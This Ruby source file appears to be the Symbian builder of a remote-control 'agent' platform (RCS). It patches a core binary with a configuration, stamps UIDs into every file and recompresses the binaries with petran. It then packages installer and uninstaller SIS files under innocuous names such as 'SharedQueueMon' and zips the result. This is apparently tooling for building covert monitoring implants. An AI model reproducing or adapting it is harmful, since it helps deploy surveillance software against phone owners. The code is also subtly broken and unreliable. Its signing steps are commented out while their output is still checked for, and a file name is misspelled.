#
#  Agent creation for symbian
#

# from RCS::Common
require 'rcs-common/trace'

require 'yaml'
require 'find'

module RCS
module DB

class BuildSymbian < Build

  def initialize
    super
    @platform = 'symbian'
  end

  def patch(params)

    trace :debug, "Build: patching: #{params}"

    # add the file to be patched to the params
    # these params will be passed to the super
    params[:core] = '5th/SharedQueueMon_20023635.exe'

    # invoke the generic patch method with the new params
    super

    params[:core] = '3rd/SharedQueueMon_20023635.exe'
    params[:config] = '2009093023'
    
    # invoke the generic patch method with the new params
    super

  end

  def sign(params)
    trace :debug, "Build: signing: #{params}"

    yaml = File.open(File.join(Config::CONF_DIR, "symbian.yaml"), 'r') {|f| f.read}
    uids = YAML.load(yaml)

    # the UIDS must be 8 chars (padded with zeros)
    uids.collect! {|u| u.rjust(8, '0')}

    trace :debug, "Build: signing with UIDS #{uids.inspect}"

    # substitute the UIDS into every file
    Find.find(@tmpdir).each do |file|
      if File.file?(file)
        content = File.open(file, 'rb') {|f| f.read}
        content['[:UID1:]'] = uids[0] if content['[:UID1:]']
        content['[:UID2:]'] = uids[1] if content['[:UID2:]']
        content['[:UID3:]'] = uids[2] if content['[:UID3:]']
        content['[:UID4:]'] = uids[3] if content['[:UID4:]']
        content['[:UID5:]'] = uids[4] if content['[:UID5:]']
        content['[:UID6:]'] = uids[5] if content['[:UID6:]']
        File.open(file, 'wb') {|f| f.write content}
      end
    end

    FileUtils.cp(path('5th/rsc'), path("5th/#{uids[0]}.rsc"))
    FileUtils.cp(path('5th/rsc'), path("3rd/#{uids[0]}.rsc"))

    trace :debug, "Build: rebuilding with petran"

    CrossPlatform.exec path('petran'), "-uid3 0x#{uids[1]} -sid 0x#{uids[1]} -compress #{path('5th/SharedQueueMon_20023635.exe')}"
    CrossPlatform.exec path('petran'), "-uid3 0x#{uids[1]} -sid 0x#{uids[1]} -compress #{path('3rd/SharedQueueMon_20023635.exe')}"

    CrossPlatform.exec path('petran'), "-uid3 0x#{uids[2]} -sid 0x#{uids[2]} -compress #{path('5th/SharedQueueSrv_20023634.exe')}"
    CrossPlatform.exec path('petran'), "-uid3 0x#{uids[2]} -sid 0x#{uids[2]} -compress #{path('3rd/SharedQueueSrv_20023634.exe')}"

    CrossPlatform.exec path('petran'), "-uid3 0x#{uids[3]} -sid 0x#{uids[3]} -compress #{path('5th/SharedQueueCli_20023633.dll')}"
    CrossPlatform.exec path('petran'), "-uid3 0x#{uids[3]} -sid 0x#{uids[3]} -compress #{path('3rd/SharedQueueCli_20023633.dll')}"

    CrossPlatform.exec path('petran'), "-uid3 0x#{uids[4]} -sid 0x#{uids[4]} -compress #{path('5th/Uninstaller.exe')}"
    CrossPlatform.exec path('petran'), "-uid3 0x#{uids[4]} -sid 0x#{uids[4]} -compress #{path('3rd/Uninstaller.exe')}"

    CrossPlatform.exec path('petran'), "-uid3 0x#{uids[5]} -sid 0x#{uids[5]} -compress #{path('5th/UninstMonitor.exe')}"
    CrossPlatform.exec path('petran'), "-uid3 0x#{uids[5]} -sid 0x#{uids[5]} -compress #{path('3rd/UninstMonitor.exe')}"

    trace :debug, "Build: creating sis files"

    CrossPlatform.exec path('makesis'), "uninstaller.pkg uninstaller.sis", {chdir: path('5th')}
    File.exist? path('5th/uninstaller.sis') or raise("makesis failed for uninstaller")

    CrossPlatform.exec path('makesis'), "uninstaller.pkg uninstaller.sis", {chdir: path('3rd')}
    File.exist? path('3rd/uninstaller.sis') or raise("makesis failed for uninstaller")

    trace :debug, "Build: creating sisx files"

    #CrossPlatform.exec path('signsis'), "-s uninstaller.sis uninstaller.sisx cert key pass", {chdir: path('5th')}
    File.exist? path('5th/uninstaller.sisx') or raise("signsis failed for uninstaller")

    #CrossPlatform.exec path('signsis'), "-s uninstaller.sis uninstaller.sisx", {chdir: path('3rd')}
    File.exist? path('3rd/uninstaller.sisx') or raise("signsis failed for uninstaller")

    trace :debug, "Build: final installer #{params['edition']}"

    installer = path("installer-#{params['edition']}.pkg")

    CrossPlatform.exec path('makesis'), "#{installer} installer.sis", {chdir: path('')}
    File.exist? path('installer.sis') or raise("makesis failed for installer")

    #CrossPlatform.exec path('signsis'), "-s installer.sis installer.sisx", {chdir: path('')}
    File.exist? path('installer.sisx') or raise("signsis failed for installer")
  end

  def pack(params)
    trace :debug, "Build: pack: #{params}"

    Zip::ZipFile.open(path('output.zip'), Zip::ZipFile::CREATE) do |z|
      z.file.open('installer.sisx', "w") { |f| f.write File.open(path('intaller.sisx'), 'rb') {|f| f.read} }
    end

    # this is the only file we need to output after this point
    @outputs = ['output.zip']

  end


end

end #DB::
end #RCS::
